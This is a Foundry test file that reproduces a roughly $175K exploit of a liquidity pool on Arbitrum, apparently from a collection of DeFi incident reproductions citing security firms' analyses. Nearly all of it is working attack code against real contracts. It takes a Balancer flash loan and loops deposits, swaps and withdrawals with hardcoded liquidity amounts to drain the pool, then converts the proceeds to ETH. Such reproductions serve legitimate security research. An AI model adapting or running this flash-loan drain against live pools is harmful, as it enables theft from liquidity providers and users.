// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$175K
// Attacker : https://arbiscan.io/address/0x4843e00ef4c9f9f6e6ae8d7b0a787f1c60050b01
// Attack Contract : https://arbiscan.io/address/0x9e8675365366559053f964be5838d5fca008722c
// Vulnerable Contract : https://arbiscan.io/address/0x15a024061c151045ba483e9243291dee6ee5fd8a
// Attack Tx : https://arbiscan.io/tx/0x57c96e320a3b885fabd95dd476d43c0d0fb10500d940d9594d4a458471a87abe

// @Analysis
// https://twitter.com/AnciliaInc/status/1712676040471105870
// https://twitter.com/CertiKAlert/status/1712707006979613097

interface IPool {
    function deposit(
        address token,
        uint256 amount,
        address to,
        uint256 deadline
    ) external returns (uint256 liquidity);

    function quotePotentialWithdraw(
        address token,
        uint256 liquidity
    ) external view returns (uint256 amount, uint256 fee, bool enoughCash);

    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external returns (uint256 actualToAmount, uint256 haircut);

    function withdraw(
        address token,
        uint256 liquidity,
        uint256 minimumAmount,
        address to,
        uint256 deadline
    ) external returns (uint256 amount);
}

contract ContractTest is Test {
    IERC20 private constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 private constant USDCe = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 private constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 private constant USDT_LP = IERC20(0xCFf307451E52B7385A7538f4cF4A861C7a60192B);
    IERC20 private constant USDC_LP = IERC20(0x7CC32EE9567b48182E5424a2A782b2aa6cD0B37b);
    IBalancerVault private constant Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IPool private constant Pool = IPool(0x15A024061c151045ba483e9243291Dee6Ee5fD8A);
    IPancakeRouter private constant SushiRouter = IPancakeRouter(payable(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506));

    function setUp() public {
        vm.createSelectFork("arbitrum", 140_129_166);
        vm.label(address(USDT), "USDT");
        vm.label(address(USDCe), "USDCe");
        vm.label(address(WETH), "WETH");
        vm.label(address(Vault), "Vault");
        vm.label(address(USDT_LP), "USDT_LP");
        vm.label(address(USDC_LP), "USDC_LP");
        vm.label(address(Pool), "Pool");
        vm.label(address(SushiRouter), "SushiRouter");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        USDT.approve(address(SushiRouter), type(uint256).max);
        USDCe.approve(address(SushiRouter), type(uint256).max);

        address[] memory tokens = new address[](2);
        tokens[0] = address(USDT);
        tokens[1] = address(USDCe);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = USDCe.balanceOf(address(USDC_LP)) * 2;
        amounts[1] = USDT.balanceOf(address(USDT_LP)) * 3;

        Vault.flashLoan(address(this), tokens, amounts, abi.encode(1));
        swapTokensSushi(USDT, USDT.balanceOf(address(this)));
        swapTokensSushi(USDCe, USDCe.balanceOf(address(this)));

        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        USDT.approve(address(Pool), type(uint256).max);
        USDCe.approve(address(Pool), type(uint256).max);
        USDT_LP.approve(address(Pool), type(uint256).max);
        USDC_LP.approve(address(Pool), type(uint256).max);

        uint256[] memory potentialWithdraws = new uint256[](10);
        potentialWithdraws[0] = 262_774_935_488;
        potentialWithdraws[1] = 281_538_919_198;
        potentialWithdraws[2] = 289_459_196_390;
        potentialWithdraws[3] = 297_534_181_283;
        potentialWithdraws[4] = 311_074_071_725;
        potentialWithdraws[5] = 329_085_528_111;
        potentialWithdraws[6] = 350_236_264_578;
        potentialWithdraws[7] = 374_148_346_983;
        potentialWithdraws[8] = 400_443_817_669;
        potentialWithdraws[9] = 428_928_171_469;

        uint8 i;
        while (i < 10) {
            uint256 amountDeposit1 = USDCe.balanceOf(address(USDC_LP)) * 2;
            uint256 amountDeposit2 = USDT.balanceOf(address(USDT_LP)) * 3;
            uint256 amountSwap1 = amountDeposit2 - amountDeposit2 / 3;
            uint256 diffUSDT = USDT.balanceOf(address(this)) - amountDeposit1;
            uint256 diffUSDCe = USDCe.balanceOf(address(this)) - amountDeposit2;

            deposit(address(USDT), amountDeposit1);
            deposit(address(USDCe), amountDeposit2 / 3);
            Pool.swap(address(USDCe), address(USDT), amountSwap1, 0, address(this), block.timestamp + 1000);

            // Not working logic. I leave this for the future update
            // uint256 liquidity = USDT_LP.balanceOf(address(this));
            // uint8 j;
            // while (j < 20) {
            //     uint256 doubledLiquidity = liquidity * 2;
            //     liquidity = doubledLiquidity >> 1;
            //     Pool.quotePotentialWithdraw(address(USDT), liquidity);
            //     ++j;
            // }

            withdraw(address(USDT), potentialWithdraws[i]);

            uint256 fromAmountUSDT = (USDT.balanceOf(address(this)) - diffUSDT) * 3;
            Pool.swap(address(USDT), address(USDCe), fromAmountUSDT >> 2, 0, address(this), block.timestamp + 1000);

            withdraw(address(USDT), USDT_LP.balanceOf(address(this)));

            uint256 fromAmountUSDCe = (USDCe.balanceOf(address(this)) - diffUSDCe);
            Pool.swap(address(USDCe), address(USDT), fromAmountUSDCe >> 1, 0, address(this), block.timestamp);

            withdraw(address(USDCe), USDC_LP.balanceOf(address(this)));
            ++i;
        }
        USDT.transfer(address(Vault), amounts[0]);
        USDCe.transfer(address(Vault), amounts[1]);
    }

    function deposit(address token, uint256 amount) internal {
        Pool.deposit(address(token), amount, address(this), block.timestamp);
    }

    function withdraw(address token, uint256 amount) internal {
        Pool.withdraw(address(token), amount, 0, address(this), block.timestamp + 1000);
    }

    function swapTokensSushi(IERC20 token, uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(WETH);

        SushiRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp + 1000
        );
    }

    receive() external payable {}
}
